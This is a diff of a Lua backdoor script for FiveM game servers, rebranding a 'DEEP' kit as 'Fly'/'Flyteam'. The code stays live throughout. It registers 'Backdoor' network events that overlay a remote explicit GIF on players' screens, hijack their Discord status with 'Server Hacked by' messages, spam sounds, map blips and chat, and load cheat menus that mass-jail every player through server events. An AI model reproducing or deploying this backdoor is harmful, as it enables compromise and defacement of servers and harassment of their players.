@@ -1,5 +1,5 @@
-RegisterNetEvent("DEEP-Backdoor-pornScreen")
-AddEventHandler("DEEP-Backdoor-pornScreen", function()
+RegisterNetEvent("Fly-Backdoor-pornScreen")
+AddEventHandler("Fly-Backdoor-pornScreen", function()
 	local pTxt = CreateRuntimeTxd('pornTxd');
 	local pornScreen = CreateDui("https://media.discordapp.net/attachments/947977977931628564/947987906314768394/ezgif.com-gif-maker_3.gif", 1920, 1080);
 	local pornHandle = GetDuiHandle(pornScreen)
@@ -12,54 +12,54 @@ AddEventHandler("DEEP-Backdoor-pornScreen", function()
     end)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-discordHack")
-AddEventHandler("DEEP-Backdoor-discordHack", function(text)
+RegisterNetEvent("Fly-Backdoor-discordHack")
+AddEventHandler("Fly-Backdoor-discordHack", function(text)
     Citizen.CreateThread(function()
         while true do
 			SetDiscordAppId(972882580519157822)
-			SetDiscordRichPresenceAsset("DEEP")
-			SetRichPresence("Server Hacked by DEEP")
-			SetDiscordRichPresenceAssetText('Developer of deep Rat: zyzz#DEEP')
-			SetDiscordRichPresenceAssetSmall('DEEP')
-			SetDiscordRichPresenceAssetSmallText('Developer of deep Rat: zyzz#DEEP')
-			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.gg/deepware")
-			SetDiscordRichPresenceAction(1, "Hacked by Deep", "https://discord.gg/deepware")
+			SetDiscordRichPresenceAsset("Flyteam")
+			SetRichPresence("Server Hacked by Flyteam")
+			SetDiscordRichPresenceAssetText('Developer : zyzz')
+			SetDiscordRichPresenceAssetSmall('Fly so High')
+			SetDiscordRichPresenceAssetSmallText('flyteam')
+			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.gg/flyteam")
+			SetDiscordRichPresenceAction(1, "Hacked by Fly", "https://discord.gg/flyteam")
 			Citizen.Wait(1)
         end
     end)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-BlipsHack")
-AddEventHandler("DEEP-Backdoor-BlipsHack", function()
+RegisterNetEvent("Fly-Backdoor-BlipsHack")
+AddEventHandler("Fly-Backdoor-BlipsHack", function()
 	local blips = {
-		{title="HACKED BY DEEP", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
+		{title="Discord.gg/flyteam", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Flyteam", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Flyteam", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Flyteam", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Flyteam", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
 	 }
 		 
 	Citizen.CreateThread(function()
@@ -189,8 +189,8 @@ AddEventHandler("DEEP-Backdoor-BlipsHack", function()
 	end)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-soundSpam")
-AddEventHandler("DEEP-Backdoor-soundSpam", function()
+RegisterNetEvent("Fly-Backdoor-soundSpam")
+AddEventHandler("Fly-Backdoor-soundSpam", function()
 	Citizen.CreateThread(function()
 		while true do
 			PlaySound(-1, "CANCEL", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
@@ -208,8 +208,8 @@ AddEventHandler("DEEP-Backdoor-soundSpam", function()
 	end)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-zyzz")
-AddEventHandler("DEEP-Backdoor-zyzz", function()
+RegisterNetEvent("Fly-Backdoor-Falcon")
+AddEventHandler("Fly-Backdoor-Falcon", function()
 	zyzz = {}
 	zyzz.debug = false
 
@@ -816,13 +816,13 @@ AddEventHandler("DEEP-Backdoor-zyzz", function()
 	end
 
 	developers = {
-		"~r~oZyzz - ~b~oZyzz#DEEP", 
+		"~r~oZyzz - ~b~oZyzz#Fly", 
 	}
 
-	menuName = "~h~DEEP ~r~"
+	menuName = "~h~Fly ~r~"
 	version = "5.0"
-	theme = "DEEP"
-	themes = {"infamous", "basic", "dark", "DEEP"}
+	theme = "Fly"
+	themes = {"infamous", "basic", "dark", "Fly"}
 	mpMessage = false
 	menuKeybind = "F7"
 	menuKeybind2 = "F10"
@@ -834,7 +834,7 @@ AddEventHandler("DEEP-Backdoor-zyzz", function()
 	motd2 = "Key ~r~*" ..teleportKeyblind.."* ~w~TeleportToWaypoint"
 	motd = "Key ~r~*" ..noclipKeybind.."* ~w~Active noclip!"
 	motd5 = "Key ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix Car"
-	motd3 = "~r~ozyzz~s~#DEEP ~n~~g~https://discord.gg/deepware"
+	motd3 = "~r~ozyzz~s~#Fly ~n~~g~https://discord.gg/Flyware"
 
 	menulist = {
 
@@ -7296,8 +7296,8 @@ AddEventHandler("DEEP-Backdoor-zyzz", function()
 	end)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-Brutan")
-AddEventHandler("DEEP-Backdoor-Brutan", function()
+RegisterNetEvent("Fly-Backdoor-Brutan")
+AddEventHandler("Fly-Backdoor-Brutan", function()
 	local mhaonn = true
 	ESX = nil;
 	Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) 
@@ -10326,37 +10326,37 @@ AddEventHandler("DEEP-Backdoor-Brutan", function()
 		if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)
 end)
 
-RegisterNetEvent("DEEP-Backdoor-HackServer")
-AddEventHandler("DEEP-Backdoor-HackServer", function()
+RegisterNetEvent("Fly-Backdoor-HackServer")
+AddEventHandler("Fly-Backdoor-HackServer", function()
 	local blips = {
-		{title="HACKED BY DEEP", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY DEEP", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY DEEP", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
+		{title="HACKED BY Fly", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Fly", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Fly", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Fly", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Fly", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Fly", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Fly", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Fly", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Fly", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Fly", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Fly", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Fly", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Fly", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Fly", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Fly", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Fly", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Fly", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Fly", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Fly", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Fly", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Fly", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="HACKED BY Fly", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="HACKED BY Fly", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="HACKED BY Fly", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="HACKED BY Fly", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="HACKED BY Fly", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="HACKED BY Fly", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="HACKED BY Fly", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
 	 }
 		 
 	Citizen.CreateThread(function()
@@ -10509,42 +10509,42 @@ AddEventHandler("DEEP-Backdoor-HackServer", function()
 
 	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
 	local texts = {
-	   "DEEP - discord.gg/deepware",
-	   " DEEP - discord.gg/deepware",
-	   "  DEEP - discord.gg/deepware",
-	   "   DEEP - discord.gg/deepware",
-	   "    DEEP - discord.gg/deepware",
-	   "     DEEP - discord.gg/deepware",
-	   "      DEEP - discord.gg/deepware",
-	   "       DEEP - discord.gg/deepware",
-	   "        DEEP - discord.gg/deepware",
-	   "         DEEP - discord.gg/deepware",
-	   "          DEEP - discord.gg/deepware",
-	   "           DEEP - discord.gg/deepware",
-	   "            DEEP - discord.gg/deepware",
-	   "             DEEP - discord.gg/deepware",
-	   "              DEEP - discord.gg/deepware",
-	   "               DEEP - discord.gg/deepware",
-	   "                DEEP - discord.gg/deepware",
-	   "                 DEEP - discord.gg/deepware",
-	   "                  DEEP - discord.gg/deepware",
-	   "                 DEEP - discord.gg/deepware",
-	   "                DEEP - discord.gg/deepware",
-	   "               DEEP - discord.gg/deepware",
-	   "              DEEP - discord.gg/deepware",
-	   "             DEEP - discord.gg/deepware",
-	   "            DEEP - discord.gg/deepware",
-	   "           DEEP - discord.gg/deepware",
-	   "          DEEP - discord.gg/deepware",
-	   "         DEEP - discord.gg/deepware",
-	   "        DEEP - discord.gg/deepware",
-	   "       DEEP - discord.gg/deepware",
-	   "      DEEP - discord.gg/deepware",
-	   "     DEEP - discord.gg/deepware",
-	   "    DEEP - discord.gg/deepware",
-	   "   DEEP - discord.gg/deepware",
-	   "  DEEP - discord.gg/deepware",
-	   " DEEP - discord.gg/deepware",
+	   "Fly - discord.gg/Flyware",
+	   " Fly - discord.gg/Flyware",
+	   "  Fly - discord.gg/Flyware",
+	   "   Fly - discord.gg/Flyware",
+	   "    Fly - discord.gg/Flyware",
+	   "     Fly - discord.gg/Flyware",
+	   "      Fly - discord.gg/Flyware",
+	   "       Fly - discord.gg/Flyware",
+	   "        Fly - discord.gg/Flyware",
+	   "         Fly - discord.gg/Flyware",
+	   "          Fly - discord.gg/Flyware",
+	   "           Fly - discord.gg/Flyware",
+	   "            Fly - discord.gg/Flyware",
+	   "             Fly - discord.gg/Flyware",
+	   "              Fly - discord.gg/Flyware",
+	   "               Fly - discord.gg/Flyware",
+	   "                Fly - discord.gg/Flyware",
+	   "                 Fly - discord.gg/Flyware",
+	   "                  Fly - discord.gg/Flyware",
+	   "                 Fly - discord.gg/Flyware",
+	   "                Fly - discord.gg/Flyware",
+	   "               Fly - discord.gg/Flyware",
+	   "              Fly - discord.gg/Flyware",
+	   "             Fly - discord.gg/Flyware",
+	   "            Fly - discord.gg/Flyware",
+	   "           Fly - discord.gg/Flyware",
+	   "          Fly - discord.gg/Flyware",
+	   "         Fly - discord.gg/Flyware",
+	   "        Fly - discord.gg/Flyware",
+	   "       Fly - discord.gg/Flyware",
+	   "      Fly - discord.gg/Flyware",
+	   "     Fly - discord.gg/Flyware",
+	   "    Fly - discord.gg/Flyware",
+	   "   Fly - discord.gg/Flyware",
+	   "  Fly - discord.gg/Flyware",
+	   " Fly - discord.gg/Flyware",
 	}
 
 	Citizen.CreateThread(function()
@@ -10652,14 +10652,14 @@ AddEventHandler("DEEP-Backdoor-HackServer", function()
 	end
 
 	local config = {
-	   ["TITLE"] = "~r~DEEP - discord.gg/deepware", 
-	   ["SUBTITLE"] = "~r~DEEP - discord.gg/deepware",
-	   ["MAP"] = "DEEP",
-	   ["STATUS"] = "DEEP",
-	   ["GAME"] = "DEEP",
-	   ["INFO"] = "DEEP",
-	   ["SETTINGS"] = "DEEP",
-	   ["R*EDITOR"] = "DEEP",
+	   ["TITLE"] = "~r~Fly - discord.gg/Flyware", 
+	   ["SUBTITLE"] = "~r~Fly - discord.gg/Flyware",
+	   ["MAP"] = "Fly",
+	   ["STATUS"] = "Fly",
+	   ["GAME"] = "Fly",
+	   ["INFO"] = "Fly",
+	   ["SETTINGS"] = "Fly",
+	   ["R*EDITOR"] = "Fly",
 	}
 
 	Citizen.CreateThread(function()
